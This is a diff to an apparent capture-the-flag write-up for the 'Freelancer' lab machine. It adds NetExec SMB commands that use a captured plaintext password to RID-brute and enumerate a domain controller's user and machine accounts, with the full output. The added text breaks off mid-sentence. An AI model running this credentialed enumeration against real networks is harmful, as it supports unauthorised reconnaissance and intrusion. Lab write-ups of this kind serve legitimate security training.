@@ -396,5 +396,83 @@ There is only default SMB shares
 
 ## Users
 ```python
-
+nxc smb dc.freelancer.htb -u mikasaAckerman -p 'IL0v3ErenY3ager' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC$
+mikasaAckerman
+sshd
+SQLBackupOperator
+sql_svc
+DATACENTER-2019$
+lorra199
+maya.artmes
+michael.williams
+sdavis
+d.jones
+jen.brown
+taylor
+jmartinez
+olivia.garcia
+dthomas
+sophia.h
+Ethan.l
+wwalker
+jgreen
+evelyn.adams
+hking
+alex.hill
+samuel.turner
+ereed
+leon.sk
+DATAC2-2022$
+WS1-WIIN10$
+WS2-WIN11$
+WS3-WIN11$
+DC2$
+carol.poland
+lkazanof
+SETUPMACHINE$
 ```
+
+Ill use `--rid-brute` to also grab machine accounts
+
+```python
+nxc smb dc.freelancer.htb -u mikasaAckerman -p 'IL0v3ErenY3ager' --users
+SMB         10.129.66.164   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.66.164   445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager 
+SMB         10.129.66.164   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.129.66.164   445    DC               Administrator                 2024-05-27 17:59:50 0       Built-in account for administering the computer/domain 
+SMB         10.129.66.164   445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
+SMB         10.129.66.164   445    DC               krbtgt                        2023-08-24 01:47:22 0       Key Distribution Center Service Account 
+SMB         10.129.66.164   445    DC               mikasaAckerman                2024-05-27 17:58:13 0       Database Developer 
+SMB         10.129.66.164   445    DC               sshd                          2023-08-28 18:30:29 0        
+SMB         10.129.66.164   445    DC               SQLBackupOperator             2023-09-21 07:26:05 1       SQL Backup Operator Account for Temp Schudeled SQL Express Backups 
+SMB         10.129.66.164   445    DC               sql_svc                       2023-11-02 19:10:09 1       MSSQL Database Domain Account 
+SMB         10.129.66.164   445    DC               lorra199                      2023-10-04 12:19:13 1       IT Support Technician 
+SMB         10.129.66.164   445    DC               maya.artmes                   2023-10-12 01:15:22 0       System Analyzer 
+SMB         10.129.66.164   445    DC               michael.williams              2023-10-12 01:40:29 0       Department Manager 
+SMB         10.129.66.164   445    DC               sdavis                        2023-10-12 01:44:58 0       IT Support 
+SMB         10.129.66.164   445    DC               d.jones                       2023-10-12 01:49:15 0       Software Developer 
+SMB         10.129.66.164   445    DC               jen.brown                     2023-10-12 01:51:04 0       Software Developer 
+SMB         10.129.66.164   445    DC               taylor                        2023-10-12 01:52:40 0       Human Resources Specialist 
+SMB         10.129.66.164   445    DC               jmartinez                     2023-10-12 01:57:32 0       Executive Manager 
+SMB         10.129.66.164   445    DC               olivia.garcia                 2023-10-12 02:19:04 0       WSGI Manager 
+SMB         10.129.66.164   445    DC               dthomas                       2023-10-12 02:45:32 0       System Analyzer 
+SMB         10.129.66.164   445    DC               sophia.h                      2023-10-12 03:02:17 0       Datacenter Manager 
+SMB         10.129.66.164   445    DC               Ethan.l                       2023-10-12 03:11:23 0       DJango Developer 
+SMB         10.129.66.164   445    DC               wwalker                       2023-10-12 03:20:06 0       Active Directory Trusts Manager 
+SMB         10.129.66.164   445    DC               jgreen                        2023-10-12 03:25:04 0       Active Directory Accounts Operator 
+SMB         10.129.66.164   445    DC               evelyn.adams                  2023-10-12 03:27:06 0       Active Directory Accounts Operator 
+SMB         10.129.66.164   445    DC               hking                         2023-10-12 03:35:58 0        
+SMB         10.129.66.164   445    DC               alex.hill                     2023-10-12 03:40:27 0       DJango Developer 
+SMB         10.129.66.164   445    DC               samuel.turner                 2023-10-12 03:43:51 0        
+SMB         10.129.66.164   445    DC               ereed                         2023-10-12 04:04:24 0       Site Reliability Engineer (SRE) 
+SMB         10.129.66.164   445    DC               leon.sk                       2023-11-02 05:20:04 0       Site Reliability Engineer (SRE) 
+SMB         10.129.66.164   445    DC               carol.poland                  2023-11-02 06:20:51 0       IT Technician 
+SMB         10.129.66.164   445    DC               lkazanof                      2023-10-19 23:39:28 1       System Reliability Monitor (SRM) & Account Operator 
+SMB         10.129.66.164   445    DC               [*] Enumerated 29 local users: FREELANCER
+```
+
+Also using `--use`
